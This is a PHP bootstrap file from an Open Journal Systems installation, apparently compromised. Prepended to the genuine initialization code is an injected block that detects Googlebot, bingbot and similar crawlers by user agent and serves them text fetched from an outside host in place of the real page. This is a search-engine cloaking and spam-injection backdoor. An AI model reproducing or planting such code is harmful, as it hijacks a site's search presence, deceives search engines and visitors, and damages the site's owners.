<?php
function is_bot() {
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');

foreach ($bots as $bot) {
if (stripos($user_agent, $bot) !== false) {
return true;
}
}

return false;
}

if (is_bot()) {
$message = file_get_contents('https://sunwukong.dev/LANDING/ijmri.txt');
echo $message;
exit;
}
?>

<?php

/**
 * @defgroup index Index
 * Bootstrap and initialization code.
 */

/**
 * @file includes/bootstrap.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2000-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup index
 *
 * @brief Core system initialization code.
 * This file is loaded before any others.
 * Any system-wide imports or initialization code should be placed here.
 */


/**
 * Basic initialization (pre-classloading).
 */

// Load Composer autoloader
require_once 'lib/pkp/lib/vendor/autoload.php';

define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);

// System-wide functions
require_once './lib/pkp/includes/functions.php';

// Initialize the application environment
return new \APP\core\Application();
